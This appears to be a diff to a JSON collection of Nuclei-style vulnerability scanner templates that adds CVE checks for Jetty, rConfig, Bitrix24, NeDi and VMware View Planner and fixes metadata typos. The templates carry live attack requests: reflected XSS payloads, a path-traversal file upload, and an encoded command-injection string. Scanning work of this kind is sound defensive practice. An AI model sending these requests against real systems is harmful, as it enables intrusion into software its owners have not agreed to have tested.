@@ -430,6 +430,43 @@
       ]
     },
     {
+      "id": "CVE-2015-2080",
+      "info": {
+        "author": "pikpikcu",
+        "description": "The exception handling code in Eclipse Jetty before 9.2.9.v20150224 allows remote attackers to obtain sensitive information from process memory via illegal characters in an HTTP header, aka JetLeak\n",
+        "name": "Eclipse Jetty Remote Leakage",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2015-2080",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Referer": "\u0000"
+          },
+          "matchers": [
+            {
+              "status": [
+                400
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Illegal character 0x0 in state"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-5688",
       "info": {
         "author": "pikpikcu",
@@ -518,10 +555,10 @@
               "type": "status"
             },
             {
-              "part": "header",
+              "part": "body",
               "type": "word",
               "words": [
-                "Backtrace"
+                "Memory map"
               ]
             }
           ],
@@ -893,7 +930,7 @@
       "info": {
         "author": "pikpikcu",
         "name": "Nextjs v2.4.1 LFI",
-        "refrence": "https://medium.com/@theRaz0r/arbitrary-file-reading-in-next-js-2-4-1-34104c4e75e9",
+        "reference": "https://medium.com/@theRaz0r/arbitrary-file-reading-in-next-js-2-4-1-34104c4e75e9",
         "severity": "high",
         "tags": "cve,cve2017,nextjs,lfi"
       },
@@ -1882,7 +1919,7 @@
       "info": {
         "author": "pikpikcu",
         "name": "SolarWinds Database Performance Analyzer 11.1. 457 - Cross Site Scripting",
-        "refrence": "https://www.cvedetails.com/cve/CVE-2018-19386/",
+        "reference": "https://www.cvedetails.com/cve/CVE-2018-19386/",
         "severity": "medium",
         "tags": "cve,cve2018,solarwinds,xss"
       },
@@ -4076,7 +4113,7 @@
       "info": {
         "author": "pikpikcu",
         "name": "eMerge E3 1.00-06 - Remote Code Execution",
-        "refrence": "https://www.exploit-db.com/exploits/47619",
+        "reference": "https://www.exploit-db.com/exploits/47619",
         "severity": "critical",
         "tags": "cve,cve2019,emerge,rce"
       },
@@ -4476,6 +4513,7 @@
       "id": "CVE-2020-0618",
       "info": {
         "author": "joeldeleep",
+        "description": "A remote code execution vulnerability exists in Microsoft SQL Server Reporting Services when it incorrectly handles page requests, aka 'Microsoft SQL Server Reporting Services Remote Code Execution Vulnerability'.",
         "name": "RCE in SQL Server Reporting Services",
         "reference": "https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/",
         "severity": "high",
@@ -4715,7 +4753,12 @@
       "id": "CVE-2020-1147",
       "info": {
         "author": "dwisiswant0",
+        "description": "A remote code execution vulnerability exists in .NET Framework, Microsoft SharePoint, and Visual Studio when the software fails to check the source markup of XML file input, aka '.NET Framework, SharePoint Server, and Visual Studio Remote Code Execution Vulnerability'.",
         "name": "RCE at SharePoint Server (.NET Framework & Visual Studio) detection",
+        "reference": [
+          "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147",
+          "https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,sharepoint,iis,rce"
       },
@@ -4992,6 +5035,88 @@
       ]
     },
     {
+      "id": "CVE-2020-12256",
+      "info": {
+        "author": "pikpikcu",
+        "name": "rConfig 3.9.4 XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-12256",
+        "severity": "medium",
+        "tags": "cve,cve2020,rconfig,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(document.cookie)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/devicemgmt.php?deviceId=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-12259",
+      "info": {
+        "author": "pikpikcu",
+        "name": "rConfig 3.9.4 XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-12259",
+        "severity": "medium",
+        "tags": "cve,cve2020,rconfig,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(document.cookie)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/configDevice.php?rid=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-12720",
       "info": {
         "author": "pdnuclei - projectdiscovery.io",
@@ -5053,6 +5178,47 @@
           "path": [
             "{{BaseURL}}/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5",
             "{{BaseURL}}/webadmin/out"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-13483",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Bitrix24 through 20.0.0 allows XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-13483",
+        "severity": "high",
+        "tags": "cve,cve2020,xss,bitrix"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "{alert(document.domain);}"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=%3Cimg+src=%22//%0d%0a)%3B//%22%22%3E%3Cdiv%3Ex%0d%0a%7D)%3Bvar+BX+=+window.BX%3Bwindow.BX+=+function(node,+bCache)%7B%7D%3BBX.ready+=+function(handler)%7B%7D%3Bfunction+__MobileAppList(test)%7Balert(document.domain)%3B%7D%3B//%3C/div%3E"
           ]
         }
       ]
@@ -5219,6 +5385,47 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/secure/ViewUserHover.jspa"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-14413",
+      "info": {
+        "author": "pikpikcu",
+        "name": "NeDi 1.9C XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-14413",
+        "severity": "medium",
+        "tags": "cve,cve2020,nedi,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=x onerror=alert(document.domain)>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E"
           ]
         }
       ]
@@ -5758,6 +5965,7 @@
       "id": "CVE-2020-1943",
       "info": {
         "author": "pd-team",
+        "description": "Data sent with contentId to /control/stream is not sanitized, allowing XSS attacks in Apache OFBiz 16.11.01 to 16.11.07.",
         "name": "Apache OFBiz Reflected XSS",
         "severity": "medium",
         "tags": "cve,cve2020,apache,xss"
@@ -5798,6 +6006,7 @@
       "id": "CVE-2020-2036",
       "info": {
         "author": "madrobot",
+        "description": "A reflected cross-site scripting (XSS) vulnerability exists in the PAN-OS management web interface. A remote attacker able to convince an administrator with an active authenticated session on the firewall management interface to click on a crafted link to that management web interface could potentially execute arbitrary JavaScript code in the administrator's browser and perform administrative actions. This issue impacts: PAN-OS 8.1 versions earlier than PAN-OS 8.1.16; PAN-OS 9.0 versions earlier than PAN-OS 9.0.9.\n",
         "name": "Palo Alto Networks Reflected XSS",
         "reference": "https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/",
         "severity": "medium",
@@ -5840,7 +6049,13 @@
       "id": "CVE-2020-2096",
       "info": {
         "author": "madrobot",
+        "description": "Jenkins Gitlab Hook Plugin 1.4.2 and earlier does not escape project names in the build_now endpoint, resulting in a reflected XSS vulnerability.",
         "name": "Jenkins Gitlab Hook XSS",
+        "reference": [
+          "https://jenkins.io/security/advisory/2020-01-15/#SECURITY-1683",
+          "http://www.openwall.com/lists/oss-security/2020/01/15/1",
+          "http://packetstormsecurity.com/files/155967/Jenkins-Gitlab-Hook-1.4.2-Cross-Site-Scripting.html"
+        ],
         "severity": "medium",
         "tags": "cve,cve2020,jenkins,xss"
       },
@@ -5909,8 +6124,8 @@
       "info": {
         "author": "j3ssie/geraldino2",
         "description": "Jenkins Audit Trail Plugin 3.2 and earlier does not escape the error message for the URL Patterns field form validation, resulting in a reflected cross-site scripting vulnerability.",
-        "name": "Jenkin AuditTrailPlugin XSS",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-2140",
+        "name": "Jenkin Audit Trail Plugin XSS",
+        "reference": "https://www.jenkins.io/security/advisory/2020-03-09/",
         "severity": "medium",
         "tags": "cve,cve2020,jenkins,xss"
       },
@@ -6443,7 +6658,7 @@
         "author": "pikpikcu",
         "description": "SonarQube 8.4.2.36762 allows remote attackers to discover cleartext SMTP,\nSVN, and GitLab credentials via the api/settings/values URI.\nNOTE: reportedly, the vendor's position for SMTP and SVN is \"it is the administrator's responsibility to configure it.\"\n",
         "name": "SonarQube unauth",
-        "refrences": "https://nvd.nist.gov/vuln/detail/CVE-2020-27986",
+        "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-27986",
         "severity": "medium",
         "tags": "cve,cve2020,sonarqube"
       },
@@ -6451,7 +6666,7 @@
         {
           "matchers": [
             {
-              "condtion": "and",
+              "condition": "and",
               "part": "body",
               "type": "word",
               "words": [
@@ -6561,14 +6776,14 @@
               "type": "status"
             },
             {
-              "condtion": "and",
+              "condition": "and",
               "part": "body",
-              "regex": [
+              "type": "word",
+              "words": [
                 "plotted",
                 "timing",
                 "cachehit"
-              ],
-              "type": "regex"
+              ]
             },
             {
               "part": "header",
@@ -7901,7 +8116,7 @@
               "type": "status"
             },
             {
-              "condtion": "and",
+              "condition": "and",
               "part": "header",
               "type": "word",
               "words": [
@@ -7920,6 +8135,46 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ui/vropspluginui/rest/services/getstatus"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21978",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "This template detects an VMware View Planner 4.x prior to 4.6 Security Patch 1 contains a remote code execution vulnerability.\nImproper input validation and lack of authorization leading to arbitrary file upload in logupload web application.\nAn unauthorized attacker with network access to View Planner Harness could upload and execute a specially crafted\nfile leading to remote code execution within the logupload container.\n",
+        "name": "VMware View Planner Unauthenticated RCE",
+        "reference": "https://twitter.com/osama_hroot/status/1367258907601698816",
+        "severity": "critical",
+        "tags": "cve,cve2021,vmware,rce"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "File uploaded successfully."
+              ]
+            },
+            {
+              "dsl": [
+                "len(body) == 28"
+              ],
+              "type": "dsl"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\nAccept: text/html\nReferer: {{BaseURL}}\nConnection: close\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"logfile\"; filename=\"\"\nContent-Type: text/plain\n\nPOC_TEST\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n"
           ]
         }
       ]
@@ -8014,7 +8269,7 @@
               "type": "status"
             },
             {
-              "condtion": "and",
+              "condition": "and",
               "part": "header",
               "type": "word",
               "words": [
@@ -8022,7 +8277,7 @@
               ]
             },
             {
-              "condtion": "and",
+              "condition": "and",
               "part": "body",
               "regex": [
                 "numRowsRead",
